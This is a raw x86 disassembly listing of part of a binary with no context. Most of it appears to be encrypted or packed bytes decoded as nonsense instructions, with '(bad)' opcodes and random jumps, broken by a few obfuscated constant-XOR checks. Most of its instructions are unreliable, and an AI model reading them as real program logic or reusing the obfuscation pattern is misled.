  40bf5a:	or     edi,edx
  40bf5c:	mov    dl,0xc4
  40bf5e:	(bad)  
  40bf5f:	in     al,dx
  40bf60:	pop    edx
  40bf61:	inc    eax
  40bf62:	in     eax,0x94
  40bf64:	fistp  WORD PTR [ecx-0x2c181130]
  40bf6a:	(bad)  
  40bf6b:	icebp  
  40bf6c:	pop    esi
  40bf6d:	xor    ebp,DWORD PTR [edx+0x3]
  40bf70:	mov    DWORD PTR [edx],eax
  40bf72:	mov    eax,0x77ec4483
  40bf77:	pop    ecx
  40bf78:	sbb    bl,BYTE PTR [edx]
  40bf7a:	push   ebp
  40bf7b:	mov    ah,0x3e
  40bf7d:	imul   edi,DWORD PTR [eax-0x76],0xc7b1b70b
  40bf84:	mov    edi,DWORD PTR [ebp+0x8]
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	push   edi
  40bfbe:	xor    BYTE PTR [ecx+0x29],bh
  40bfc1:	ds xchg esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	lahf   
  40bfca:	xchg   edx,eax
  40bfcb:	sbb    BYTE PTR [esi+0x331c91d8],dh
  40bfd1:	mov    BYTE PTR [edi+esi*1],ch
  40bfd4:	sub    BYTE PTR [eax],0x54
  40bfd7:	mov    edi,0x924e4bcf
  40bfdc:	rol    BYTE PTR [eax+ecx*8-0x33997972],1
  40bfe3:	cli    
  40bfe4:	rol    BYTE PTR [eax-0x6f497daf],0xcd
  40bfeb:	add    al,0x36
  40bfed:	jno    0x40bff7
  40bfef:	rcl    BYTE PTR [esi],cl
  40bff1:	stos   DWORD PTR es:[edi],eax
  40bff2:	(bad)  
  40bff3:	jb     0x40c000
  40bff5:	cwde   
  40bff6:	ret    
  40bff7:	stos   DWORD PTR es:[edi],eax
  40bff8:	xchg   ebx,eax
  40bff9:	mov    bl,0x9b
  40bffb:	push   ds
  40bffc:	jne    0x40c004
  40bffe:	ret    
  40bfff:	push   es
  40c000:	cmp    al,BYTE PTR ds:0x649bea37
  40c006:	inc    eax
  40c007:	cmp    al,0x2
  40c009:	jp     0x40c068
  40c00b:	pop    ss
  40c00c:	xor    al,0x12
  40c00e:	mov    eax,ds:0x7cc6baf
  40c013:	iret   
  40c014:	leave  
  40c015:	jmp    0x40c067
  40c017:	sub    DWORD PTR [ebx-0x42],eax
  40c01a:	or     ch,bl
  40c01c:	pop    es
  40c01d:	dec    ah
  40c01f:	loopne 0x40c047
  40c021:	push   es
  40c022:	inc    eax
  40c023:	or     eax,0xe406f04d
  40c028:	dec    ecx
  40c029:	pop    es
  40c02a:	push   ebp
  40c02b:	call   DWORD PTR [ecx-0x6e]
  40c02e:	arpl   WORD PTR [esi+edi*4+0x53],cx
  40c032:	pop    esi
  40c033:	pop    esi
  40c034:	add    ebx,DWORD PTR [esi+eax*2+0x6f]
  40c038:	pop    es
  40c039:	mov    edx,0x6606057b
  40c03e:	mov    edi,edx
  40c040:	daa    
  40c041:	or     eax,0x8f11d523
  40c046:	loopne 0x40c031
  40c048:	leave  
  40c049:	test   al,0x41
  40c04b:	push   es
  40c04c:	push   edx
  40c04d:	mov    edi,edi
  40c04f:	shr    BYTE PTR [esi-0x32d71373],cl
  40c055:	sbb    esp,esp
  40c057:	xor    BYTE PTR [ecx-0x49fc6207],bl
  40c05d:	xchg   ebx,eax
  40c05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c05f:	jnp    0x40c0ae
  40c061:	lods   eax,DWORD PTR ds:[esi]
  40c062:	lds    esi,FWORD PTR [ebx+0x150c50de]
  40c068:	mov    edx,0xf5b9f88d
  40c06d:	sbb    ebp,esi
  40c06f:	rol    dh,0x16
  40c072:	xlat   BYTE PTR ds:[ebx]
  40c073:	(bad)  
  40c074:	cmp    eax,0x82b2f6ba
  40c079:	fsub   st,st(0)
  40c07b:	ret    
  40c07c:	jno    0x40c090
  40c07e:	mov    cl,0x2b
  40c080:	fcmove st,st(0)
  40c082:	mov    esp,0x63f8e506
  40c087:	cld    
  40c088:	xor    al,0x84
  40c08a:	sub    DWORD PTR [ecx+0x62],0x52
  40c08e:	cmp    esp,eax
  40c090:	imul   edx,DWORD PTR [ebx+0x5d6167a],0x455c80cf
  40c09a:	mov    bl,0x8e
  40c09c:	cdq    
  40c09d:	test   al,0xcd
  40c09f:	rol    BYTE PTR [esi+0x11],cl
  40c0a2:	lods   eax,DWORD PTR ds:[esi]
  40c0a3:	push   ecx
  40c0a4:	fld    TBYTE PTR [edi+0x52]
  40c0a7:	mov    ecx,0x5392690f
  40c0ac:	fmul   DWORD PTR [edx]
  40c0ae:	sbb    ebx,DWORD PTR [eax+0x1a7e0a6b]
  40c0b4:	jge    0x40c0b5
  40c0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b7:	pop    es
  40c0b8:	(bad)  
  40c0ba:	repnz mov ebp,DWORD PTR [eax+edi*4]
  40c0be:	pop    es
  40c0bf:	(bad)
  40c0c3:	test   al,0x3c
  40c0c5:	push   0x77fc4ac8
  40c0ca:	cmp    DWORD PTR [ebx+0x5],eax
  40c0cd:	js     0x40c148
  40c0cf:	push   es
  40c0d0:	xchg   ch,al
  40c0d2:	fldcw  WORD PTR ds:0xe562a77
  40c0d8:	fistp  WORD PTR [edx+eax*8-0x26914807]
  40c0df:	test   BYTE PTR [eax+0xf],bh
  40c0e2:	adc    DWORD PTR [ebp-0x45],edx
  40c0e5:	aam    0x8
  40c0e7:	mov    edx,0x827e2cb9
  40c0ec:	push   es
  40c0ed:	and    bh,bl
  40c0ef:	scas   eax,DWORD PTR es:[edi]
  40c0f0:	sahf   
  40c0f1:	jb     0x40c0e8
  40c0f3:	push   edi
  40c0f4:	loopne 0x40c099
  40c0f6:	xchg   edi,eax
  40c0f7:	ret    
  40c0f8:	lahf   
  40c0f9:	jb     0x40c0bc
  40c0fb:	adc    BYTE PTR [eax-0x340b1dff],0x8f
  40c102:	add    bh,BYTE PTR [ebp*8+0x33c59b56]
  40c109:	cmp    al,0x19
  40c10b:	sbb    esp,esp
  40c10d:	push   ss
  40c10e:	aas    
  40c10f:	ret    0x1fc0
  40c112:	das    
  40c113:	xchg   esp,eax
  40c114:	mov    eax,ds:0xdbcda276
  40c119:	test   DWORD PTR ds:0xe2dbdd8b,ebx
  40c11f:	fmulp  st(2),st
  40c121:	cmp    eax,0xbcfb94db
  40c126:	stc    
  40c127:	inc    esi
  40c128:	xchg   edx,eax
  40c129:	loope  0x40c103
  40c12b:	shr    DWORD PTR [esi+0x7a],cl
  40c12e:	test   DWORD PTR [edx+0xb],edx
  40c131:	pop    es
  40c132:	ds addr16 enter 0x4922,0xac
  40c138:	aam    0x24
  40c13a:	mov    bh,0x36
  40c13c:	mov    dh,0x2a
  40c13e:	push   ss
  40c13f:	ret    
  40c140:	std    
  40c141:	ss cmc 
  40c143:	jns    0x40c151
  40c145:	jae    0x40c0f2
  40c147:	into   
  40c148:	fst    QWORD PTR [edi]
  40c14a:	(bad)  
  40c14b:	repnz enter 0xe71d,0x77
  40c150:	hlt    
  40c151:	popa   
  40c152:	mov    esi,gs
  40c154:	bswap  esp
  40c156:	dec    edx
  40c157:	sbb    al,0xf0
  40c159:	shl    BYTE PTR [eax],0x99
  40c15c:	inc    esi
  40c15d:	pop    edi
  40c15e:	dec    eax
  40c15f:	loop   0x40c15b
  40c161:	push   ss
  40c162:	lods   al,BYTE PTR ds:[esi]
  40c163:	push   0xca274aa0
  40c168:	fxch   st(1)
  40c16a:	loope  0x40c164
  40c16c:	xchg   esi,eax
  40c16d:	mov    edx,0xf403d44d
  40c172:	pop    ss
  40c173:	mov    esp,0x41316839
  40c178:	pop    edi
  40c179:	(bad)  
  40c17a:	mov    esi,0x9e13e711
  40c17f:	loop   0x40c1e9
  40c181:	push   esp
  40c182:	dec    ebp
  40c183:	pop    es
  40c184:	dec    ecx
  40c185:	push   esi
  40c186:	pushf  
  40c187:	cs jle 0x40c15b
  40c18a:	ins    DWORD PTR es:[edi],dx
  40c18b:	inc    edi
  40c18c:	test   al,0xfc
  40c18e:	jbe    0x40c1f5
  40c190:	jo     0x40c205
  40c192:	clc    
  40c193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c194:	jle    0x40c202
  40c196:	sbb    eax,0xccf066
  40c19b:	mov    ds:0x2a687d49,eax
  40c1a0:	mov    bl,0x4a
  40c1a2:	(bad)  ss:[ecx]
  40c1a5:	fistp  QWORD PTR [edx+esi*1-0x7c]
  40c1a9:	loopne 0x40c135
  40c1ab:	mov    dh,0x1e
  40c1ad:	mov    BYTE PTR [edi],ah
  40c1af:	rcr    DWORD PTR [eax+eax*2+0x5eaa2849],0x1
  40c1b7:	mov    al,0x71
  40c1b9:	inc    esi
  40c1ba:	fld    DWORD PTR [ebx]
  40c1bc:	dec    ebx
  40c1bd:	pop    es
  40c1be:	ss jae 0x40c1ce
  40c1c1:	pop    edx
  40c1c2:	pop    ebx
  40c1c3:	fidiv  DWORD PTR [ebx]
  40c1c5:	mov    esi,DWORD PTR [ecx]
  40c1c7:	es mov es,ecx
  40c1ca:	add    eax,0xada001c2
  40c1cf:	jns    0x40c1c2
  40c1d1:	xchg   ecx,eax
  40c1d2:	pop    ebp
  40c1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1d4:	jne    0x40c206
  40c1d6:	out    dx,al
  40c1d7:	pop    eax
  40c1d8:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1da:	ret    
  40c1db:	fidiv  WORD PTR [edi-0x7932f027]
  40c1e1:	dec    ecx
  40c1e2:	stc    
  40c1e3:	mov    esp,0xcf97ef21
  40c1e8:	jnp    0x40c234
  40c1ea:	ret    
  40c1eb:	inc    ecx
  40c1ec:	in     eax,dx
  40c1ed:	(bad)  
  40c1ee:	push   ss
  40c1ef:	jmp    0x40c1e7
  40c1f1:	jmp    0xed36:0x6d52047e
  40c1f8:	sub    al,0xa4
  40c1fa:	or     dl,BYTE PTR [edx+eiz*4-0x55]
  40c1fe:	lahf   
  40c1ff:	inc    esi
  40c200:	in     al,dx
  40c201:	ret    0xd19f
  40c204:	xchg   ecx,ecx
  40c206:	(bad)  
  40c207:	ds mov edx,0x142549de
  40c20d:	gs ja  0x40c206
  40c210:	cmp    ebx,ebx
  40c212:	cmc    
  40c213:	out    dx,eax
  40c214:	int    0x50
  40c216:	(bad)  
  40c217:	pop    edi
  40c218:	cmpxchg BYTE PTR [ebx-0x5d],dl
  40c21c:	xor    esp,DWORD PTR [edi-0x7260fc48]
  40c222:	cli    
  40c223:	mov    esi,0xd593847b
  40c228:	inc    ch
  40c22a:	scas   al,BYTE PTR es:[edi]
  40c22b:	mov    dh,0x4c
  40c22d:	in     al,0x21
  40c22f:	bound  esi,QWORD PTR [esi]
  40c231:	cld    
  40c232:	xchg   esp,eax
  40c233:	test   edx,0x38e14a4b
  40c239:	int3   
  40c23a:	pop    esp
  40c23b:	sbb    BYTE PTR [esi],ah
  40c23d:	xor    al,0xf2
  40c23f:	and    al,BYTE PTR [edx]
  40c241:	sahf   
  40c242:	inc    ebx
  40c244:	mov    dl,0x7a
  40c246:	stc    
  40c247:	lahf   
  40c248:	adc    al,BYTE PTR [ebx+0x29]
  40c24b:	ds icebp 
  40c24d:	sbb    bl,ah
  40c24f:	cmc    
  40c250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c251:	pop    esi
  40c252:	repz mov cs:0x7cc74759,eax
  40c259:	jae    0x40c1f1
  40c25b:	inc    edi
  40c25c:	sub    ebp,DWORD PTR [esi+0x4d1d3b8d]
  40c262:	cmp    BYTE PTR [ebp+eax*2+0x6da31317],dl
  40c269:	mov    edi,0xc2c1d180
  40c26e:	adc    DWORD PTR [eax+0x21],eax
  40c271:	add    al,0x3d
  40c273:	imul   BYTE PTR [ebx+eax*2-0x39525a5d]
  40c27a:	jp     0x40c29f
  40c27c:	out    0x25,eax
  40c27e:	pop    ds
  40c27f:	popa   
  40c280:	push   ebx
  40c281:	ret    0x70e
  40c284:	xchg   ebp,eax
  40c285:	mov    al,0x2e
  40c287:	int3   
  40c288:	jae    0x40c282
  40c28a:	lock in eax,dx
  40c28c:	fisub  WORD PTR [edx]
  40c28e:	adc    BYTE PTR [ebx+0x3f],dh
  40c291:	add    ebx,ebp
  40c293:	push   esi
  40c294:	xor    DWORD PTR [eax+0x543374ef],ebx
  40c29a:	pop    ds
  40c29b:	mov    dh,0x66
  40c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c29e:	cwde   
  40c29f:	mov    ch,0xba
  40c2a1:	call   0x87bf712b
  40c2a6:	ret    0xe208
  40c2a9:	ret    
  40c2aa:	inc    edi
  40c2ab:	or     dh,0x27
  40c2ae:	inc    ecx
  40c2af:	or     al,0x82
  40c2b1:	ja     0x40c2c1
  40c2b3:	and    cl,al
  40c2b5:	sbb    DWORD PTR [edi],eax
  40c2b7:	out    dx,eax
  40c2b8:	stc    
  40c2b9:	dec    ecx
  40c2ba:	int    0xfb
  40c2bc:	pop    esp
  40c2bd:	repnz aam 0x4f
  40c2c0:	ror    DWORD PTR [ebx-0x74f146bb],1
  40c2c6:	inc    ebp
  40c2c7:	fsub   DWORD PTR [esi-0x75]
  40c2ca:	jge    0x40c2a0
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x63],bh
  40c2e3:	std    
  40c2e4:	mov    bh,0x56
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	(bad)  
  40c2ef:	adc    dl,BYTE PTR [esi]
  40c2f1:	lea    eax,[ecx+0x153dadb5]
  40c2f7:	mov    bh,dl
  40c2f9:	ror    DWORD PTR [eax+0x52],0x9
  40c2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2fe:	scas   al,BYTE PTR es:[edi]
  40c2ff:	in     eax,0x1
  40c301:	xor    DWORD PTR [ecx],0xad4fa278
  40c307:	mov    edi,DWORD PTR [eax]
  40c309:	inc    ebx
  40c30a:	aam    0xe4
  40c30c:	xchg   ecx,eax
  40c30d:	xchg   DWORD PTR [edi],ebx
  40c30f:	popa   
  40c310:	into   
  40c311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c312:	lods   al,BYTE PTR ds:[esi]
  40c313:	mov    dh,0xa3
  40c315:	adc    cl,ah
  40c317:	pop    edi
  40c318:	arpl   WORD PTR [esp+ecx*4-0x4e0620bc],cx
  40c31f:	push   0xffffffd2
  40c321:	mov    bl,0x28
  40c323:	popa   
  40c324:	pop    ds
  40c325:	and    esp,DWORD PTR [edi]
  40c327:	not    DWORD PTR [ebx-0x27]
  40c32a:	inc    eax
  40c32b:	inc    esp
  40c32c:	in     eax,0x40
  40c32e:	push   esp
  40c32f:	ret    
  40c330:	fadd   DWORD PTR [eax]
  40c332:	cmc    
  40c333:	mov    DWORD PTR [edx-0x5f],ecx
  40c336:	xchg   edx,eax
  40c337:	pusha  
  40c338:	out    0xc,eax
  40c33a:	or     al,0x79
  40c33c:	xchg   DWORD PTR [ebx-0x73b9bd57],ebp
  40c342:	cli    
  40c343:	jecxz  0x40c39a
  40c345:	je     0x40c345
  40c347:	xor    DWORD PTR [ebp-0x67],0xe9b730d9
  40c34e:	inc    DWORD PTR [ebx]
  40c350:	push   ss
  40c351:	mov    esi,0x7c57bfca
  40c356:	pushf  
  40c357:	(bad)  
  40c358:	fcomp  DWORD PTR [edx]
  40c35a:	push   eax
  40c35b:	sub    ch,BYTE PTR [ebp+0x28a81515]
  40c361:	adc    al,0xfe
  40c363:	fimul  DWORD PTR ds:0x19f60488
  40c369:	jb     0x40c2fb
  40c36b:	pop    ss
  40c36c:	gs xchg edx,eax
  40c36e:	retf   0xe846
  40c371:	jnp    0x40c3cb
  40c373:	cmp    esi,ebp
  40c375:	mov    al,0xda
  40c377:	pop    ebx
  40c378:	xor    BYTE PTR [eax+0x37],ch
  40c37b:	mov    DWORD PTR [esi+eax*4],ebp
  40c37e:	dec    edi
  40c37f:	sub    BYTE PTR [ebp-0x79],0xd4
  40c383:	sbb    al,0xff
  40c385:	mov    bl,0x3
  40c387:	cmc    
  40c388:	stos   BYTE PTR es:[edi],al
  40c389:	mov    al,ds:0x57f9e5a2
  40c38e:	cdq    
  40c38f:	shr    BYTE PTR [ebx],1
  40c391:	mov    ebx,0x464a3559
  40c396:	xchg   ecx,eax
  40c397:	xlat   BYTE PTR ds:[ebx]
  40c398:	jae    0x40c3dd
  40c39a:	nop
  40c39b:	mov    WORD PTR [eax-0x6],ss
  40c39e:	mov    ds:0x10cbd5a,al
  40c3a3:	xchg   esp,eax
  40c3a4:	mov    al,ds:0xf08e785d
  40c3a9:	rcl    BYTE PTR [eax-0x7c],1
  40c3ac:	je     0x40c39e
  40c3ae:	data16 (bad) 
  40c3b0:	pop    esi
  40c3b1:	dec    edx
  40c3b2:	or     eax,0xc3ba6a
  40c3b7:	mov    ds:0xe3b2ffcf,al
  40c3bc:	jle    0x40c3df
  40c3be:	sub    esi,eax
  40c3c0:	adc    esi,DWORD PTR [eax+0x4121a6b3]
  40c3c6:	jbe    0x40c36a
  40c3c8:	stos   BYTE PTR es:[edi],al
  40c3c9:	shl    BYTE PTR [esi+0x5a],1
  40c3cc:	cli    
  40c3cd:	call   0x614:0xa6e8bb73
  40c3d4:	fs xchg ecx,eax
  40c3d6:	ret    0x6fde
  40c3d9:	mov    dh,0x36
  40c3db:	outs   dx,DWORD PTR ss:[esi]
  40c3dd:	jbe    0x40c3f2
  40c3df:	bound  ebx,QWORD PTR ss:[ecx+0x51]
  40c3e3:	sub    BYTE PTR [ebx+0x68],cl
  40c3e6:	outs   dx,BYTE PTR ds:[esi]
  40c3e7:	in     al,dx
  40c3e8:	pop    esi
  40c3e9:	mov    ds:0xda77e539,al
  40c3ee:	enter  0xfe32,0xac
  40c3f2:	ins    BYTE PTR es:[edi],dx
  40c3f3:	aas    
  40c3f4:	or     BYTE PTR [edx],ch
  40c3f6:	outs   dx,DWORD PTR ds:[esi]
  40c3f7:	das    
  40c3f8:	cmp    al,0x79
  40c3fa:	jle    0x40c3b6
  40c3fc:	sahf   
  40c3fd:	or     ebx,DWORD PTR [edx+0x1d]
  40c400:	js     0x40c455
  40c402:	js     0x40c3a1
  40c404:	pusha  
  40c405:	mov    esi,0xf20266c9
  40c40a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c40b:	adc    bh,BYTE PTR [ecx+edi*4]
  40c40e:	push   ebx
  40c40f:	dec    ecx
  40c410:	sbb    eax,0xe8ca0f5c
  40c415:	xlat   BYTE PTR ds:[ebx]
  40c416:	fsubp  st(0),st
  40c418:	pop    ebp
  40c419:	or     ch,BYTE PTR [ebx+edx*4-0x30]
  40c41d:	adc    BYTE PTR [eax],bh
  40c41f:	fld    TBYTE PTR [ecx+0x409fc503]
  40c425:	in     al,dx
  40c426:	and    BYTE PTR [edi-0x5a9c3e11],dl
  40c42c:	test   al,0xa6
  40c42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42f:	push   0xffffffac
  40c431:	icebp  
  40c432:	push   edi
  40c433:	inc    ebx
  40c434:	lods   eax,DWORD PTR ds:[esi]
  40c435:	mov    dh,0x8c
  40c437:	aas    
  40c438:	sbb    cl,dh
  40c43a:	mov    ebx,0x8a662d73
  40c43f:	push   esp
  40c440:	call   0x26d8:0xa115635e
  40c447:	sbb    DWORD PTR [ebp-0x5548bdef],edx
  40c44d:	(bad)  
  40c44e:	and    DWORD PTR [edx+esi*8+0x9],ebx
  40c452:	imul   ebx,ebx,0xc5033971
  40c458:	repnz xchg edi,eax
  40c45a:	pop    ebp
  40c45b:	mov    edx,esi
  40c45d:	retf   0xf612
  40c460:	or     eax,DWORD PTR ds:0x5e5b08e
  40c466:	add    al,0xb7
  40c468:	mov    eax,ds:0x5f62c282
  40c46d:	cmp    BYTE PTR [ecx+0x53],ah
  40c470:	cmp    BYTE PTR [eax],bl
  40c472:	jge    0x40c495
  40c474:	adc    al,BYTE PTR [esi+0x77]
  40c477:	jnp    0x40c439
  40c479:	iret   
  40c47a:	inc    ebx
  40c47b:	and    eax,DWORD PTR [ecx]
  40c47d:	test   dl,0x25
  40c480:	dec    eax
  40c481:	jne    0x40c45c
  40c483:	icebp  
  40c484:	inc    BYTE PTR [esi+esi*8-0x7d0acaab]
  40c48b:	leave  
  40c48c:	inc    esi
  40c48d:	mov    al,ds:0x629c743d
  40c492:	xor    eax,0xeafb38f1
  40c497:	sbb    DWORD PTR [ebx-0x61fc2396],ecx
  40c49d:	push   edx
  40c49e:	push   esi
  40c49f:	aas    
  40c4a0:	jbe    0x40c4c0
  40c4a2:	push   0x6694b324
  40c4a7:	and    ebp,DWORD PTR [esi-0x1d]
  40c4aa:	or     ebx,DWORD PTR [eax]
  40c4ac:	mov    eax,ds:0x348d2f3d
  40c4b1:	addr16 jae 0x40c47b
  40c4b4:	xchg   DWORD PTR [ecx],ebp
  40c4b6:	mov    ch,0x4d
  40c4b8:	test   BYTE PTR [eax],dl
  40c4ba:	add    ah,ch
  40c4bc:	icebp  
  40c4bd:	jbe    0x40c4d5
  40c4bf:	lds    edx,FWORD PTR [edi]
  40c4c1:	or     al,0x6c
  40c4c3:	mov    ecx,0xae95b483
  40c4c8:	mov    BYTE PTR [esi+0x282cb93d],dl
  40c4ce:	(bad)
  40c4d2:	push   ss
  40c4d3:	xchg   DWORD PTR [ebx-0xd5d82fa],ecx
  40c4d9:	push   esi
  40c4da:	add    DWORD PTR [edx-0x7],edi
  40c4dd:	aaa    
  40c4de:	pop    ss
  40c4df:	test   BYTE PTR [esi+0x7d],al
  40c4e2:	or     BYTE PTR [ecx],0x60
  40c4e5:	imul   DWORD PTR [esi+0x6e]
  40c4e8:	out    0xbb,eax
  40c4ea:	retf   
  40c4eb:	mov    edi,0x623213ea
  40c4f0:	inc    esp
  40c4f1:	jae    0x40c4e5
  40c4f3:	aad    0xac
  40c4f5:	pop    ds
  40c4f6:	clc    
  40c4f7:	inc    ebx
  40c4f8:	sbb    cl,bh
  40c4fa:	jmp    0x40c55e
  40c4fc:	sub    eax,0x1ba77fdb
  40c501:	jb     0x40c562
  40c503:	es push eax
  40c505:	call   DWORD PTR [edx+0x64]
  40c508:	test   BYTE PTR [edi+eiz*4+0x35],bh
  40c50c:	test   BYTE PTR [edx+0x710eb55d],0x6d
  40c513:	push   edi
  40c514:	xlat   BYTE PTR ds:[ebx]
  40c515:	mov    cl,BYTE PTR [ebx+0x16]
  40c518:	bound  edx,QWORD PTR [eax+0x1e]
  40c51b:	inc    esi
  40c51c:	inc    esp
  40c51d:	mov    bh,0x55
  40c51f:	inc    eax
  40c520:	push   eax
  40c521:	enter  0xcd9d,0x12
  40c525:	inc    edi
  40c526:	mov    esp,0x8bc35f9c
  40c52b:	mov    fs,edi
  40c52d:	outs   dx,BYTE PTR ds:[esi]
  40c52e:	stos   DWORD PTR es:[edi],eax
  40c52f:	jnp    0x40c532
  40c531:	nop
  40c532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c533:	pop    esi
  40c534:	ja     0x40c538
  40c536:	jecxz  0x40c4e9
  40c538:	push   esi
  40c539:	and    dl,ch
  40c53b:	retf   
  40c53c:	jmp    0x116c1362
  40c541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c542:	js     0x40c530
  40c544:	xor    ebx,edi
  40c546:	int    0xef
  40c548:	xchg   ecx,eax
  40c549:	les    ecx,FWORD PTR [esp+ebp*8]
  40c54c:	mov    dh,0xe2
  40c54e:	cli    
  40c54f:	test   DWORD PTR [esi],esi
  40c551:	shl    edx,0x42
  40c554:	add    DWORD PTR [ebx],ebp
  40c556:	call   0xe64f:0x88a4497f
  40c55d:	arpl   WORD PTR [ebx-0x52289702],ax
  40c563:	xor    eax,0x8efa5282
  40c568:	cmp    edi,DWORD PTR [ecx]
  40c56a:	loopne 0x40c505
  40c56c:	mov    ?,esp
  40c56e:	inc    edi
  40c56f:	dec    esi
  40c570:	pop    ecx
  40c571:	push   cs
  40c572:	xchg   esp,eax
  40c573:	dec    ebx
  40c574:	lods   al,BYTE PTR ds:[esi]
  40c575:	and    ecx,DWORD PTR [edx+0xec00c8e]
  40c57b:	dec    ecx
  40c57c:	mov    eax,0x1043991f
  40c581:	dec    esi
  40c582:	fs mov edi,0xcf534f55
  40c588:	jae    0x40c592
  40c58a:	push   eax
  40c58b:	gs sti 
  40c58d:	(bad)  
  40c58f:	into   
  40c590:	mov    BYTE PTR [esi],cl
  40c592:	pop    edx
  40c593:	jbe    0x40c56b
  40c595:	push   esi
  40c596:	jo     0x40c5ab
  40c598:	stos   DWORD PTR es:[edi],eax
  40c599:	aad    0x3b
  40c59b:	test   BYTE PTR [ebx-0x59],dh
  40c59e:	cmp    dl,BYTE PTR [ebx+edi*8-0x46]
  40c5a2:	into   
  40c5a3:	mov    ecx,0x934016a1
  40c5a8:	cwde   
  40c5a9:	stos   DWORD PTR es:[edi],eax
  40c5aa:	mov    ds:0x8c6183b,al
  40c5af:	popa   
  40c5b0:	mov    WORD PTR [edi-0x63d7e3de],es
  40c5b6:	icebp  
  40c5b7:	adc    al,0xa8
  40c5b9:	pop    ebx
  40c5ba:	jl     0x40c59f
  40c5bc:	push   esi
  40c5bd:	mov    DWORD PTR [edi-0x7306810f],eax
  40c5c3:	fstp   QWORD PTR [ebx+0x2c]
  40c5c6:	push   0xffffffc1
  40c5c8:	xor    DWORD PTR [esi+0x1f606d09],edx
  40c5ce:	inc    ecx
  40c5cf:	xchg   esp,ebx
  40c5d1:	nop
  40c5d2:	mov    esp,edx
  40c5d4:	dec    eax
  40c5d5:	jmp    0x6b0972a4
  40c5da:	mov    ecx,0x820f3e2c
  40c5df:	rcl    DWORD PTR [esi-0x55],cl
  40c5e2:	pop    esi
  40c5e3:	mov    dl,0x51
  40c5e5:	retf   0x9b09
  40c5e8:	aas    
  40c5e9:	jns    0x40c651
  40c5eb:	xor    edi,ebx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0xafd2d2f7
  40c613:	mov    DWORD PTR [edx+0x1],esp
  40c616:	ss cwde 
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	fwait
  40c61f:	lock addr16 es jg 0x40c634
  40c624:	sbb    eax,0x17ea4a0f
  40c629:	push   ecx
  40c62a:	or     ah,dh
  40c62c:	xchg   ebp,eax
  40c62d:	xchg   edi,eax
  40c62e:	into   
  40c62f:	inc    ebp
  40c630:	scas   al,BYTE PTR es:[edi]
  40c631:	adc    eax,0x958fbb1d
  40c636:	inc    DWORD PTR [eax-0x45]
  40c639:	xor    eax,0xdc323a59
  40c63e:	push   esi
  40c63f:	mov    ds:0xa28f28cd,al
  40c644:	mov    WORD PTR [ecx],ax
  40c647:	popf   
  40c648:	scas   eax,DWORD PTR es:[edi]
  40c649:	imul   edi,esp,0x981cb050
  40c64f:	in     al,0x87
  40c651:	sub    esp,DWORD PTR [eax]
  40c653:	or     dl,BYTE PTR [edi-0x70a118e4]
  40c659:	dec    ebx
  40c65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c65b:	das    
  40c65c:	fimul  DWORD PTR [ebx]
  40c65e:	or     dl,BYTE PTR [eax-0x47]
  40c661:	ret    0x85cb
  40c664:	push   es
  40c665:	inc    ebx
  40c666:	(bad)  [edi-0x16cdab5e]
  40c66c:	pop    esi
  40c66d:	outs   dx,DWORD PTR ds:[esi]
  40c66e:	and    eax,0x6aff82b1
  40c673:	add    eax,0x157ca78
  40c678:	es inc edx
  40c67a:	dec    edi
  40c67b:	sub    al,BYTE PTR [ebx+ecx*4+0x4e741c51]
  40c682:	dec    eax
  40c683:	adc    cl,BYTE PTR [edi+0x53]
  40c686:	imul   esi,DWORD PTR [ebp-0x1d],0xffffffde
  40c68a:	mov    ebp,0x8a0d3640
  40c68f:	fsub   QWORD PTR [esi]
  40c691:	add    DWORD PTR [ecx+eiz*4-0x1a],ecx
  40c695:	jo     0x40c6a7
  40c697:	pusha  
  40c698:	hlt    
  40c699:	call   ebx
  40c69b:	pop    ebp
  40c69c:	adc    BYTE PTR [edi-0x55],dh
  40c69f:	test   eax,0x39b6f292
  40c6a4:	icebp  
  40c6a5:	and    esp,DWORD PTR [edx-0x54]
